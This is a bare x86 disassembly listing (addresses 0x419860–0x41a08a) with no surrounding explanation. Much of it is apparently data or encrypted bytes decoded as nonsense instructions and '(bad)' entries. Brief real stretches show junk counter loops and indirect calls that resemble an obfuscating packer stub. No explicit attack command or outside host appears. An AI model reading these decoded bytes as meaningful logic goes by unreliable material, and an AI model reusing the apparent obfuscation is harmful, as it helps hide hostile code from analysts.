  419860:	shl    BYTE PTR [edx+edi*2+0x381405e3],cl
  419867:	pop    esi
  419868:	ficom  DWORD PTR [ebx]
  41986a:	xor    BYTE PTR [ecx-0x30],bl
  41986d:	pop    edi
  41986e:	pop    edi
  41986f:	push   ds
  419870:	scas   eax,DWORD PTR es:[edi]
  419871:	jl     0x419822
  419873:	ds adc cl,ch
  419876:	div    BYTE PTR [esi-0xe]
  419879:	shr    BYTE PTR [esi+0x56],0x22
  41987d:	(bad)  
  41987f:	adc    eax,0x34d29c9d
  419884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419885:	js     0x419830
  419887:	mov    edi,es
  419889:	jle    0x419886
  41988b:	popa   
  41988c:	cmp    BYTE PTR [ebp+0x5e],bh
  41988f:	xchg   esp,eax
  419890:	inc    eax
  419891:	mov    dl,0x5b
  419893:	dec    ebx
  419894:	dec    esi
  419895:	sub    al,0x3f
  419897:	jge    0x41990b
  419899:	popf   
  41989a:	imul   ebx,DWORD PTR [edi-0x6d],0xffffffb4
  41989e:	(bad)
  4198a1:	aad    0xd0
  4198a3:	outs   dx,DWORD PTR ds:[esi]
  4198a4:	sbb    DWORD PTR [edx],edx
  4198a6:	xchg   bl,al
  4198a8:	add    DWORD PTR [esi+0x5abbf2b2],edx
  4198ae:	mov    WORD PTR [edx+0x4ec3e7db],?
  4198b4:	push   es
  4198b5:	mov    eax,ds:0x923210bb
  4198ba:	sub    dh,bl
  4198bc:	(bad)  
  4198bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198be:	cld    
  4198bf:	fsub   DWORD PTR [ebx-0x41]
  4198c2:	and    eax,0xe0b734d6
  4198c7:	imul   edi,DWORD PTR [edi-0x2b],0x1a
  4198cb:	push   esp
  4198cc:	dec    esp
  4198cd:	mov    DWORD PTR [ecx],edi
  4198cf:	ja     0x419885
  4198d1:	cld    
  4198d2:	sub    al,0xef
  4198d4:	retf   
  4198d5:	scas   al,BYTE PTR es:[edi]
  4198d6:	xchg   ebp,eax
  4198d7:	sbb    al,0xef
  4198d9:	jp     0x4198e2
  4198db:	mov    DWORD PTR [esi-0x33],esp
  4198de:	aaa    
  4198df:	xchg   ebp,eax
  4198e0:	or     BYTE PTR [edx-0x60],0x16
  4198e4:	mov    WORD PTR [edx+0x8],es
  4198e7:	outs   dx,DWORD PTR ds:[esi]
  4198e8:	pop    eax
  4198e9:	fdiv   QWORD PTR [ecx]
  4198eb:	mov    cl,BYTE PTR [ebx+edi*1+0x59800e5b]
  4198f2:	and    esp,DWORD PTR ds:0xcee01223
  4198f8:	lahf   
  4198f9:	sbb    al,0x48
  4198fb:	nop
  4198fc:	jo     0x419904
  4198fe:	pop    esi
  4198ff:	dec    ebx
  419900:	mov    ds:0x9b1f1b1,eax
  419905:	inc    esp
  419906:	mov    ?,WORD PTR [ebx-0x4d]
  419909:	idiv   BYTE PTR [edi+0x3f]
  41990c:	stc    
  41990d:	int    0x7e
  41990f:	fst    QWORD PTR [esi+0x3d88f53f]
  419915:	ret    0xc9e5
  419918:	dec    ecx
  419919:	scas   al,BYTE PTR es:[edi]
  41991a:	or     BYTE PTR ds:0xa71aca2a,al
  419920:	int    0x1b
  419922:	fisubr WORD PTR ds:0x7fcc9059
  419928:	pop    edx
  419929:	sahf   
  41992a:	jnp    0x41996f
  41992c:	imul   ebx,esi,0x9f59a754
  419932:	popaw  
  419934:	sbb    BYTE PTR [edi],bl
  419936:	xchg   ebp,eax
  419937:	mov    esi,0x125463e0
  41993d:	test   DWORD PTR [edi],ebp
  41993f:	std    
  419940:	xchg   ebx,eax
  419941:	jmp    0x7855:0x2280cde
  419948:	xor    BYTE PTR [edx-0x3b],0xd2
  41994c:	cmp    eax,0x9721d0f2
  419951:	mov    BYTE PTR [edi+0x15fd9865],ah
  419957:	scas   al,BYTE PTR es:[edi]
  419958:	add    ah,cl
  41995a:	mov    al,0xcf
  41995c:	mov    dl,0x37
  41995e:	ins    BYTE PTR es:[edi],dx
  41995f:	jl     0x419907
  419961:	mov    esp,0x63dde46f
  419966:	fs mov eax,0x4901a414
  41996c:	je     0x41995f
  41996e:	mov    ds:0xb3dcc50d,al
  419973:	push   es
  419974:	jge    0x4199af
  419976:	xchg   ebp,eax
  419977:	icebp  
  419978:	push   eax
  419979:	in     eax,dx
  41997a:	jp     0x41997c
  41997c:	mov    esi,0x7ac196f0
  419981:	jbe    0x41992d
  419983:	mov    dh,0x3f
  419985:	mov    cl,0x77
  419987:	xchg   DWORD PTR [esi+0x4c9ad82e],ebx
  41998d:	add    BYTE PTR [ebx],dh
  41998f:	fmul   DWORD PTR [edi-0x51faa481]
  419995:	popf   
  419996:	scas   al,BYTE PTR es:[edi]
  419997:	sti    
  419998:	ds sar ebx,cl
  41999b:	inc    eax
  41999c:	xchg   ebx,eax
  41999d:	or     al,bh
  41999f:	or     ebx,ebx
  4199a1:	in     eax,0xa3
  4199a3:	imul   esi,DWORD PTR [ecx-0x674d001],0xeba6a332
  4199ad:	inc    ebx
  4199ae:	and    ebx,DWORD PTR [eax+edi*8]
  4199b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b2:	les    edx,FWORD PTR [ebp+0x5a]
  4199b5:	cmp    al,0x30
  4199b7:	pushf  
  4199b8:	push   0xffffffaf
  4199ba:	repnz fs dec esi
  4199bd:	and    al,0xc
  4199bf:	sub    edx,edi
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0xffffffe2
  419b14:	and    eax,ebx
  419b16:	mov    cl,0xd0
  419b18:	iret   
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b52
  419b20:	shl    bh,1
  419b22:	pop    esp
  419b23:	or     DWORD PTR [eax+0x654704c7],edi
  419b29:	xchg   esp,eax
  419b2a:	inc    esi
  419b2b:	adc    BYTE PTR ds:0x26d12779,bh
  419b31:	or     DWORD PTR [edx+0x34],eax
  419b34:	cmp    dl,BYTE PTR [ebp+0x55]
  419b37:	and    al,0x55
  419b39:	xchg   esi,eax
  419b3a:	jmp    0x419ba9
  419b3c:	fnstenv [edx+0x3a]
  419b3f:	lea    ebp,[eax-0x643dacce]
  419b45:	push   eax
  419b46:	mov    es,WORD PTR [ebp+0x1a2a5bde]
  419b4c:	cld    
  419b4d:	mov    edi,0xb496d719
  419b52:	sbb    DWORD PTR [esi+edx*1],eax
  419b55:	add    al,0x7b
  419b57:	and    DWORD PTR [ebx],esp
  419b59:	rcr    BYTE PTR [esi+0x2a],1
  419b5c:	pop    ecx
  419b5d:	(bad)  
  419b5e:	aas    
  419b5f:	ds jns 0x419b23
  419b62:	repnz inc esi
  419b64:	adc    eax,0x35735daf
  419b69:	add    eax,0x69c1bfd8
  419b6e:	cs cwde 
  419b70:	cli    
  419b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b72:	call   0x9c83:0xb41916ae
  419b79:	xor    esi,DWORD PTR es:[ecx+ecx*1-0x54]
  419b7e:	repz aas 
  419b80:	(bad)  
  419b81:	adc    eax,0xeb8de115
  419b86:	or     DWORD PTR [ecx],0x18138259
  419b8c:	popa   
  419b8d:	popf   
  419b8e:	sub    bl,BYTE PTR [esp+edx*4+0x72]
  419b92:	inc    esp
  419b93:	mov    edx,esi
  419b95:	pop    ss
  419b96:	dec    ebp
  419b97:	push   esi
  419b98:	imul   edi,DWORD PTR [ebp-0x19],0x7cfa2422
  419b9f:	add    ch,BYTE PTR [eax]
  419ba1:	bound  edx,QWORD PTR [ebx+0x42]
  419ba4:	pop    esi
  419ba5:	aaa    
  419ba6:	ret    0x4b9d
  419ba9:	mov    edx,0x17e831e5
  419bae:	das    
  419baf:	pushf  
  419bb0:	pop    ebx
  419bb1:	out    0x13,al
  419bb3:	in     eax,0xe1
  419bb5:	cli    
  419bb6:	cli    
  419bb7:	mov    ch,0x28
  419bb9:	int3   
  419bba:	mov    ch,0xcf
  419bbc:	data16 cmp BYTE PTR fs:[edi],bl
  419bc0:	xchg   esi,eax
  419bc1:	imul   esp,DWORD PTR [ebp+0xa04da06],0xffffffbf
  419bc8:	ins    DWORD PTR es:[edi],dx
  419bc9:	jecxz  0x419b4b
  419bcb:	outs   dx,DWORD PTR ds:[esi]
  419bcc:	inc    eax
  419bcd:	and    al,0x54
  419bcf:	and    ebp,DWORD PTR [ecx+0x2]
  419bd2:	xor    BYTE PTR [edx+0xa],ch
  419bd5:	jl     0x419c09
  419bd7:	pop    ss
  419bd8:	mov    ds:0x7b166ba1,eax
  419bdd:	mov    cl,0xbf
  419bdf:	inc    ebx
  419be0:	stc    
  419be1:	or     DWORD PTR [edx],esi
  419be3:	lds    esi,FWORD PTR [ecx+0x5cadbccd]
  419be9:	jp     0x419bf5
  419beb:	jno    0x419bf6
  419bed:	cmc    
  419bee:	pop    edi
  419bef:	in     al,0xf8
  419bf1:	mov    ds:0x67c35cd,al
  419bf6:	xchg   ebp,eax
  419bf7:	inc    esi
  419bf8:	in     eax,0x30
  419bfa:	fisubr WORD PTR [eax]
  419bfc:	push   cs
  419bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfe:	out    dx,al
  419bff:	add    ebp,DWORD PTR [esi-0x32b3d4d8]
  419c05:	fcmove st,st(1)
  419c07:	and    edi,DWORD PTR [ebx+ebx*8]
  419c0a:	xchg   edi,eax
  419c0b:	dec    ecx
  419c0c:	push   cs
  419c0d:	ja     0x419bfb
  419c0f:	push   0xd
  419c11:	pop    edx
  419c12:	or     eax,ecx
  419c14:	fdiv   DWORD PTR [eax+esi*8+0x1e]
  419c18:	jb     0x419c62
  419c1a:	push   ss
  419c1b:	ss dec ecx
  419c1d:	xor    ah,ah
  419c1f:	pop    ecx
  419c20:	jg     0x419bbf
  419c22:	(bad)  
  419c24:	xchg   DWORD PTR [esp+ebp*2],esi
  419c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c28:	outs   dx,BYTE PTR ds:[esi]
  419c29:	cs push cs
  419c2b:	call   0x24f035ab
  419c30:	scas   eax,DWORD PTR es:[edi]
  419c31:	rcl    DWORD PTR ds:0x2a4b869,cl
  419c37:	jecxz  0x419c9c
  419c39:	push   edx
  419c3a:	jno    0x419c0f
  419c3c:	cmc    
  419c3d:	or     BYTE PTR [ebx-0x57],cl
  419c40:	mov    ecx,0xfc010d20
  419c45:	imul   DWORD PTR [ebx+0x720e3e31]
  419c4b:	out    dx,eax
  419c4c:	jmp    0x3323:0x6304cc0f
  419c53:	xchg   ah,ch
  419c55:	pop    ss
  419c56:	lahf   
  419c57:	mov    bl,0x61
  419c59:	(bad)  
  419c5a:	push   edi
  419c5b:	inc    ebx
  419c5c:	mov    al,0x31
  419c5e:	int3   
  419c5f:	pop    ebp
  419c60:	mov    esi,0x1e3a1fc9
  419c65:	mov    ecx,0xfe67a18
  419c6a:	mov    bh,0x90
  419c6c:	pushf  
  419c6d:	mov    es,WORD PTR [ebx+0x73]
  419c70:	push   ebx
  419c71:	test   DWORD PTR [esp+ebx*8+0x61],0x9df5a67a
  419c79:	sub    dh,dh
  419c7b:	into   
  419c7c:	mov    eax,0x200b0918
  419c81:	ins    DWORD PTR es:[edi],dx
  419c82:	jne    0x419c14
  419c84:	test   BYTE PTR [ebx],al
  419c86:	in     al,0x3d
  419c88:	dec    ecx
  419c89:	jle    0x419ce5
  419c8b:	or     eax,0x7f7a26a2
  419c90:	adc    al,0xeb
  419c92:	movq   mm4,mm4
  419c95:	int3   
  419c96:	inc    ecx
  419c97:	adc    al,0x2d
  419c99:	cmc    
  419c9a:	popf   
  419c9b:	icebp  
  419c9c:	fs stos DWORD PTR es:[edi],eax
  419c9e:	cmp    dl,bl
  419ca0:	call   0x8cf8:0x40f489d8
  419ca7:	xchg   esp,eax
  419ca8:	cmp    ebp,edx
  419caa:	and    ah,ah
  419cac:	or     DWORD PTR [esi-0x181d4e87],edx
  419cb2:	pop    edx
  419cb3:	add    ebx,DWORD PTR [esi-0x748b8d30]
  419cb9:	mov    ?,WORD PTR [eax]
  419cbb:	cli    
  419cbc:	jecxz  0x419ce3
  419cbe:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  419cc0:	mov    al,0xc3
  419cc2:	dec    edx
  419cc3:	xchg   ebx,eax
  419cc4:	inc    ecx
  419cc5:	mov    DWORD PTR [ecx],ebx
  419cc7:	push   ds
  419cc8:	sbb    DWORD PTR [ecx-0x52],edi
  419ccb:	out    0xa3,eax
  419ccd:	mov    edi,0x81f4f461
  419cd2:	xchg   esi,eax
  419cd3:	push   ss
  419cd4:	jne    0x419c81
  419cd6:	leave  
  419cd7:	jae    0x419c9d
  419cd9:	and    edi,DWORD PTR [edi-0x65]
  419cdc:	cmp    bh,bh
  419cde:	add    eax,0x832c757a
  419ce3:	rcr    BYTE PTR [eax],1
  419ce5:	not    BYTE PTR [esi-0x15]
  419ce8:	cmp    al,0x17
  419cea:	sub    cl,dh
  419cec:	xlat   BYTE PTR cs:[ebx]
  419cee:	ret    
  419cef:	lods   al,BYTE PTR ds:[esi]
  419cf0:	es xor eax,0xf13c0957
  419cf6:	jb     0x419d39
  419cf8:	mov    eax,ds:0xd203b8ba
  419cfd:	and    ebp,ebp
  419cff:	mov    esp,0xc9ec1e2b
  419d04:	mov    al,ds:0x8c703ed2
  419d09:	xchg   BYTE PTR cs:[ebx],ch
  419d0c:	pop    edx
  419d0d:	int    0xa5
  419d0f:	call   0xe549:0x6f19e27f
  419d16:	sar    BYTE PTR [edx+0x548dbb99],0x9d
  419d1d:	sbb    BYTE PTR [ebp+0x8],al
  419d20:	retf   
  419d21:	(bad)  
  419d22:	(bad)  
  419d23:	push   ecx
  419d24:	mov    bh,0x8c
  419d26:	pop    edx
  419d27:	pop    eax
  419d28:	dec    dx
  419d2a:	adc    BYTE PTR [edi+0xd],dl
  419d2d:	lods   eax,DWORD PTR ds:[esi]
  419d2e:	xor    bl,BYTE PTR [ebx]
  419d30:	push   ebp
  419d31:	loope  0x419dae
  419d33:	pop    eax
  419d34:	cmp    bh,bh
  419d36:	xor    ecx,DWORD PTR [ebx-0x7bf01fbb]
  419d3c:	mov    DWORD PTR [ebx],ecx
  419d3e:	add    BYTE PTR [eax],al
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	and    dh,dl
  419d7e:	and    DWORD PTR [esi+0x787fcde8],edi
  419d84:	adc    BYTE PTR [esi+0x78],bh
  419d87:	js     0x419db0
  419d89:	popa   
  419d8a:	hlt    
  419d8b:	xor    BYTE PTR [edx],bl
  419d8d:	inc    esi
  419d8e:	push   esi
  419d8f:	es push edx
  419d91:	push   0x4fcf8978
  419d96:	popa   
  419d97:	loop   0x419d23
  419d99:	push   ecx
  419d9a:	lahf   
  419d9b:	test   DWORD PTR [ecx],eax
  419d9d:	sub    bl,BYTE PTR fs:[edi+esi*8-0x3e]
  419da2:	jmp    0x419d77
  419da4:	and    BYTE PTR gs:[ebx+0x5a92724],0xae
  419dac:	out    dx,al
  419dad:	enter  0x1979,0x11
  419db1:	adc    DWORD PTR [esi+0x653c166f],0xd50b2cfc
  419dbb:	(bad)  
  419dbc:	jl     0x419db6
  419dbe:	inc    ebx
  419dbf:	(bad)  
  419dc0:	cmp    ecx,DWORD PTR [ecx-0x4a]
  419dc3:	fnsave [edi+0x491879f0]
  419dc9:	add    DWORD PTR [ebp-0x7bf8fc2e],eax
  419dcf:	sahf   
  419dd0:	inc    esi
  419dd1:	popa   
  419dd2:	cmc    
  419dd3:	std    
  419dd4:	sbb    DWORD PTR [edi-0x53],esp
  419dd7:	setp   BYTE PTR [edi+0x55142f94]
  419dde:	lea    ecx,[ebp-0x39ab6f21]
  419de4:	xor    eax,0xe0d935e7
  419de9:	adc    dh,BYTE PTR [ebx]
  419deb:	scas   al,BYTE PTR es:[edi]
  419dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ded:	pop    ss
  419dee:	je     0x419e31
  419df0:	mov    edi,gs
  419df2:	dec    esi
  419df3:	xchg   edi,eax
  419df4:	sub    esi,DWORD PTR [ecx-0x1a]
  419df7:	nop
  419df8:	mov    ?,WORD PTR [edi]
  419dfa:	sub    DWORD PTR [ecx],ebx
  419dfc:	nop
  419dfd:	cmp    dh,BYTE PTR [ebp-0x5c]
  419e00:	sub    esp,DWORD PTR [esi-0x5]
  419e03:	iret   
  419e04:	pop    DWORD PTR [eax-0x1]
  419e07:	not    BYTE PTR [esi-0x5a967252]
  419e0d:	sbb    BYTE PTR [ebx],ch
  419e0f:	mov    edx,0x106864cf
  419e14:	push   ss
  419e15:	mov    edi,0xe88dc82c
  419e1a:	pushf  
  419e1b:	adc    eax,0x75ac1d7b
  419e20:	dec    ebp
  419e21:	inc    eax
  419e22:	jge    0x419dc2
  419e24:	arpl   bx,cx
  419e26:	fst    DWORD PTR [esi-0x15e938e7]
  419e2c:	test   DWORD PTR [edx+0x3acc0453],0x4dc733c
  419e36:	xor    bl,cl
  419e38:	fidivr WORD PTR [edi+0x7428114d]
  419e3e:	mov    edi,0xdddcb68c
  419e43:	inc    esp
  419e44:	cld    
  419e45:	aaa    
  419e46:	outs   dx,DWORD PTR ds:[esi]
  419e47:	sbb    ecx,edx
  419e49:	inc    ebx
  419e4a:	cmp    eax,0xe544adc9
  419e4f:	push   ebp
  419e50:	ja     0x419e0b
  419e52:	ret    0x89c0
  419e55:	xor    al,0xcc
  419e57:	push   cs
  419e58:	pop    es
  419e59:	xor    eax,0x899d3a0c
  419e5e:	dec    esp
  419e5f:	dec    ebp
  419e60:	cmp    bl,ch
  419e62:	pop    ss
  419e63:	test   DWORD PTR [edx+0x54],eax
  419e66:	dec    ecx
  419e67:	or     eax,0x813c0fb1
  419e6c:	mov    ?,esp
  419e6e:	iret   
  419e6f:	aam    0x72
  419e71:	xchg   ebx,eax
  419e72:	cmc    
  419e73:	mov    cl,0x8
  419e75:	call   0x74c9:0x82ec4413
  419e7c:	in     eax,dx
  419e7d:	jnp    0x419eaf
  419e7f:	popa   
  419e80:	jecxz  0x419e34
  419e82:	xchg   ecx,eax
  419e83:	aam    0x0
  419e85:	(bad)  
  419e86:	fnstenv [edi+0x9]
  419e89:	rol    BYTE PTR [edx+0x24],1
  419e8c:	push   ebx
  419e8d:	xor    DWORD PTR [edi+esi*2],edx
  419e90:	mov    ch,0xaf
  419e92:	jle    0x419e93
  419e94:	pushf  
  419e95:	mov    edx,0xd946b316
  419e9a:	lods   eax,DWORD PTR ds:[esi]
  419e9b:	sub    eax,0xd9993ebb
  419ea0:	or     dh,bl
  419ea2:	inc    edx
  419ea3:	loop   0x419e43
  419ea5:	adc    ebp,ecx
  419ea7:	xchg   esp,eax
  419ea8:	and    esp,esp
  419eaa:	sar    DWORD PTR [edi+0x71],1
  419ead:	mov    ecx,0x874fe469
  419eb2:	cdq    
  419eb3:	out    dx,eax
  419eb4:	push   ebx
  419eb5:	(bad)  
  419eb6:	sahf   
  419eb7:	loop   0x419eff
  419eb9:	inc    eax
  419eba:	sub    DWORD PTR [edx*4+0x75e6c7c],0xffffffa4
  419ec2:	mov    ecx,0xc958174c
  419ec7:	(bad)  
  419ec8:	mov    esp,0xb72e56d
  419ecd:	ffree  st(5)
  419ecf:	inc    edi
  419ed0:	aaa    
  419ed1:	icebp  
  419ed2:	pop    ds
  419ed3:	loopne 0x419f35
  419ed5:	mov    ecx,0x5d817469
  419eda:	push   ecx
  419edb:	adc    esi,ebp
  419edd:	pop    es
  419ede:	cld    
  419edf:	out    dx,al
  419ee0:	pop    edx
  419ee1:	dec    ebp
  419ee2:	sbb    esi,esp
  419ee4:	popa   
  419ee5:	inc    ebx
  419ee6:	sub    ch,BYTE PTR [edi+0x19]
  419ee9:	mov    edx,0x52e16ead
  419eee:	mov    ebx,0x76c8df01
  419ef3:	push   edi
  419ef4:	into   
  419ef5:	jg     0x419edd
  419ef7:	pop    esi
  419ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ef9:	pop    edx
  419efa:	mov    ebp,0xd912119f
  419eff:	ds inc ebx
  419f01:	or     al,0x19
  419f03:	push   ebx
  419f04:	jbe    0x419ee4
  419f06:	(bad)  
  419f07:	adc    al,0xf4
  419f09:	fsubr  DWORD PTR [ebx-0x41]
  419f0c:	test   BYTE PTR [ebp+0x5aaa91eb],dh
  419f12:	jmp    DWORD PTR [ecx]
  419f14:	arpl   si,cx
  419f16:	test   BYTE PTR [ebx],dh
  419f18:	ins    BYTE PTR es:[edi],dx
  419f19:	cli    
  419f1a:	jb     0x419f1e
  419f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f1d:	push   ebp
  419f1e:	addr16 je 0x419ef3
  419f21:	jg     0x419ee4
  419f23:	out    0x23,al
  419f25:	in     eax,0x77
  419f27:	mov    ebx,cs
  419f29:	clc    
  419f2a:	imul   ebx,DWORD PTR [esp+ecx*4+0x2c],0x79883e07
  419f32:	and    al,0x4
  419f34:	add    esi,DWORD PTR [ebx]
  419f36:	inc    eax
  419f37:	pop    eax
  419f38:	mov    bh,0x6f
  419f3a:	bound  ebp,QWORD PTR [ebp-0xa]
  419f3d:	adc    BYTE PTR [edx+esi*4-0x11],0xbf
  419f42:	outs   dx,DWORD PTR ds:[esi]
  419f43:	out    dx,eax
  419f44:	pop    edx
  419f45:	pop    edi
  419f46:	popf   
  419f47:	clc    
  419f48:	xchg   ebp,eax
  419f49:	xor    al,0x58
  419f4b:	cmc    
  419f4c:	adc    BYTE PTR [edi-0x53459229],al
  419f52:	mov    eax,0xda4f2f13
  419f57:	cmp    BYTE PTR [ebp-0x1c],ah
  419f5a:	sbb    eax,DWORD PTR [ebx+ebp*4-0x4b]
  419f5e:	xlat   BYTE PTR ds:[ebx]
  419f5f:	add    ah,BYTE PTR [esi+0x6f20395d]
  419f65:	mov    bh,0x5b
  419f67:	mov    al,0x73
  419f69:	inc    esp
  419f6a:	pop    ss
  419f6b:	stc    
  419f6c:	add    eax,0x1bca000d
  419f71:	inc    ebp
  419f72:	mov    ah,0x41
  419f74:	inc    edi
  419f75:	inc    esp
  419f76:	int3   
  419f77:	scas   eax,DWORD PTR es:[edi]
  419f78:	hlt    
  419f79:	mov    WORD PTR ds:0x5ff1ba29,ds
  419f7f:	add    ch,BYTE PTR [edx-0x21669d1e]
  419f85:	ffreep st(0)
  419f87:	fwait
  419f88:	sbb    dl,BYTE PTR [ebp-0x2c21bcc6]
  419f8e:	shl    BYTE PTR [esp+edx*4+0x1f8df942],0x80
  419f96:	jge    0x419fcb
  419f98:	lea    eax,[ecx]
  419f9a:	imul   ebx,ebp,0xffffffa0
  419f9d:	jae    0x41a00a
  419f9f:	or     BYTE PTR [edi],0x85
  419fa2:	xchg   ecx,eax
  419fa3:	push   es
  419fa4:	add    BYTE PTR [eax],al
  419fa6:	add    DWORD PTR ds:0x42a7c5,0x42a761
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x4f
  419fdd:	xchg   edx,eax
  419fde:	pop    es
  419fdf:	xchg   DWORD PTR [eax+0x10787fd3],eax
  419fe5:	jle    0x41a05f
  419fe7:	js     0x41a036
  419fe9:	sahf   
  419fea:	arpl   WORD PTR [ecx-0x6e],cx
  419fed:	pop    DWORD PTR [edx+eax*8+0x847cea2]
  419ff4:	popa   
  419ff5:	les    edx,FWORD PTR [ebx-0x9]
  419ff8:	mov    fs,WORD PTR [edi+0x78]
  419ffb:	cmp    eax,0x8b457484
  41a000:	cmc    
  41a001:	lea    esi,[esi+0x24]
  41a004:	adc    BYTE PTR [ebx-0xb],0xe9
  41a008:	repz dec ebx
  41a00a:	jns    0x419f95
  41a00c:	pop    ss
  41a00d:	pop    ds
  41a00e:	inc    eax
  41a00f:	test   BYTE PTR [edi-0x55],bh
  41a012:	pop    esp
  41a013:	or     eax,0x3d485703
  41a018:	lahf   
  41a019:	mov    dl,0xf8
  41a01b:	(bad)  
  41a01c:	mov    ds:0x166048,al
  41a021:	mov    al,ds:0x2830b9cb
  41a026:	xor    dl,BYTE PTR [edx-0x14]
  41a029:	dec    edi
  41a02a:	out    0x71,eax
  41a02c:	and    al,0x57
  41a02e:	or     ecx,DWORD PTR [ebx]
  41a030:	push   ds
  41a031:	das    
  41a032:	push   0xffffffef
  41a034:	jnp    0x419feb
  41a036:	push   es
  41a037:	xchg   edi,eax
  41a038:	inc    ebp
  41a039:	popa   
  41a03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a03b:	call   0xc957:0xafe554f2
  41a042:	mov    BYTE PTR [eax+0x6b],al
  41a045:	adc    esi,DWORD PTR [ecx+0x16]
  41a048:	clc    
  41a049:	push   ecx
  41a04a:	(bad)  [ebx-0x2d88434]
  41a050:	pop    eax
  41a051:	sub    eax,0x616cae94
  41a056:	sbb    esi,DWORD PTR [ebx-0x27]
  41a059:	out    dx,eax
  41a05a:	dec    ebp
  41a05b:	inc    DWORD PTR [edi+0x5f]
  41a05e:	push   edx
  41a05f:	add    edi,DWORD PTR [edi+0x62f1872b]
  41a065:	jnp    0x41a03f
  41a067:	sti    
  41a068:	cmp    BYTE PTR [esi-0x2d],bl
  41a06b:	xor    DWORD PTR [ebx-0x25],ebx
  41a06e:	inc    eax
  41a06f:	inc    edx
  41a070:	push   esi
  41a071:	aad    0x92
  41a073:	jb     0x41a0ca
  41a075:	jno    0x41a0dd
  41a077:	xchg   BYTE PTR [edi],ah
  41a079:	or     DWORD PTR [esi+0x34],edx
  41a07c:	sbb    eax,0xe77f3531
  41a081:	mov    cl,0xaa
  41a083:	int    0x32
  41a085:	or     ecx,DWORD PTR [ecx+0x6d]
  41a088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a08a:	add    edx,ebx
